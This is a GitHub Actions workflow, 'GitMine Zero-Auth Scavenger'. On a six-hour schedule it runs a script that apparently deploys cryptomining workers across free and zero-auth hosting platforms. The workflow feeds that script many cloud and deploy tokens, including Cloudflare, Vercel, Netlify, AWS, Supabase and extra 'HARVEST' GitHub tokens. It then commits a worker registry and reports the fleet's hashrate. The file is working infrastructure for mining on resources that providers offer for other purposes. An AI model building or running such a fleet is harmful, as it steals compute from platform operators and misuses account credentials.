name: GitMine Zero-Auth Scavenger

on:
  schedule:
    - cron: '30 */6 * * *'   # offset 30min from main scavenger
  workflow_dispatch:
    inputs:
      target:
        description: 'Target worker count from zero-auth platforms'
        required: false
        default: '20'

jobs:
  zeroauth_scavenge:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}

      - uses: actions/setup-python@v5
        with: {python-version: '3.11'}

      - name: Install deps
        run: pip install -q pyyaml requests

      - name: Install optional deps (fail-safe)
        run: |
          pip install -q boto3 || true
          pip install -q playwright && playwright install chromium --with-deps || true

      - name: Run Zero-Auth Scavenger
        env:
          POOL_REPO:              Ox518/genFre
          # Optional — worker count multiplies if any of these are present
          CF_API_TOKEN:           ${{ secrets.CF_API_TOKEN }}
          CF_ACCOUNT_ID:          ${{ secrets.CF_ACCOUNT_ID }}
          DENO_DEPLOY_TOKEN:      ${{ secrets.DENO_DEPLOY_TOKEN }}
          NETLIFY_AUTH_TOKEN:     ${{ secrets.NETLIFY_AUTH_TOKEN }}
          VERCEL_TOKEN:           ${{ secrets.VERCEL_TOKEN }}
          GLITCH_AUTH_TOKEN:      ${{ secrets.GLITCH_AUTH_TOKEN }}
          CODESANDBOX_TOKEN:      ${{ secrets.CODESANDBOX_TOKEN }}
          PYTHONANYWHERE_TOKEN:   ${{ secrets.PYTHONANYWHERE_TOKEN }}
          PYTHONANYWHERE_USER:    ${{ secrets.PYTHONANYWHERE_USER }}
          GITHUB_TOKEN:           ${{ secrets.GITHUB_TOKEN }}
          HARVEST_GH_TOKEN_0:     ${{ secrets.HARVEST_GH_TOKEN_0 }}
          AWS_ACCESS_KEY_ID:      ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY:  ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          SUPABASE_ACCESS_TOKEN:  ${{ secrets.SUPABASE_ACCESS_TOKEN }}
          HARVEST_DEPLOY_KEY:     ${{ secrets.HARVEST_DEPLOY_KEY }}
        run: python scripts/scavenger_zeroauth.py --target ${{ github.event.inputs.target || '20' }}

      - name: Commit registry updates
        run: |
          git config user.name  "gitmine-zeroauth"
          git config user.email "zeroauth@gitmine"
          git pull --rebase origin main
          git add fleet/harvest/
          git diff --cached --quiet || \
            git commit -m "zeroauth: $(date -u +%Y-%m-%dT%H:%M:%SZ)" && \
            git push origin HEAD:main

      - name: Summary
        run: |
          python -c "
import yaml; from pathlib import Path
m = yaml.safe_load(Path('fleet/harvest/workers.yaml').read_text()).get('meta', {})
print(f\"Workers : {m.get('active_count',0)}/{m.get('target_count',50)}\")
print(f\"Hashrate: {m.get('total_hashrate_estimate','0 H/s')}\")
"
